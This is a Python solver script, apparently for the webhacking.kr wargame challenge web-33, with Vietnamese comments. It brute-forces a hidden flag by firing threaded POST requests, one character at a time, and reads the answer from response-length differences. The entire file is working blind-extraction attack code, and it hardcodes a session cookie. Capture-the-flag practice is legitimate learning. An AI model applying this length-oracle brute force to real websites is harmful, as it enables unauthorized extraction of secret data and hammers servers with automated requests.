import requests
import threading
from queue import Queue

# URL và header
url = "https://webhacking.kr/challenge/web-33/index.php"
headers = {
    "Host": "webhacking.kr",
    "Cookie": "PHPSESSID=p9aas6alu9ekdta464mk02nli4",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "https://webhacking.kr/challenge/web-33/index.php",
    "Origin": "https://webhacking.kr"
}

# Wordlist (các ký tự có thể)
wordlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$^*()+-=[]{};:\"'<>,.?/|\\_~"

# bỏ kí tự & và % trong wordlist

# Payload cơ bản
base_payload = "flag%7B"

# Queue để lưu kết quả
result_queue = Queue()
lock = threading.Lock()

# Hàm worker cho từng luồng
def check_char_worker(char):
    payload = f"{base_payload}{char}"
    data = f"search={payload}"  # Sử dụng chuỗi thô
    try:
        response = requests.post(url, data=data, headers=headers, timeout=5)
        current_length = len(response.text)
        with lock:
            print(f"Trying '{payload}' - Response length: {current_length}")
            result_queue.put((char, current_length))
    except Exception as e:
        with lock:
            print(f"Error with '{payload}': {e}")

# Hàm kiểm tra từng vị trí
def check_char(position):
    threads = []
    baseline_length = None
    correct_char = None
    
    # Giới hạn số luồng (10 ký tự mỗi batch)
    for i in range(0, len(wordlist), 10):
        batch = wordlist[i:i + 10]
        for char in batch:
            thread = threading.Thread(target=check_char_worker, args=(char,))
            threads.append(thread)
            thread.start()
        
        for thread in threads[-10:]:
            thread.join()
    
    # Xử lý kết quả từ queue
    lengths = []
    while not result_queue.empty():
        char, current_length = result_queue.get()
        lengths.append((char, current_length))
    
    if lengths:
        baseline_length = lengths[0][1]  # Độ dài cơ bản từ ký tự đầu tiên
        for char, current_length in lengths:
            if abs(current_length - baseline_length) > 10:  # Ngưỡng chênh lệch
                correct_char = char
                print(f"Position {position}: Char '{char}' - Response length: {current_length}")
                break
    
    return correct_char

# Dò từng vị trí
position = 1
while True:
    char = check_char(position)
    if char is None:
        break
    base_payload += char
    print("base_payload:", base_payload)
    position += 1
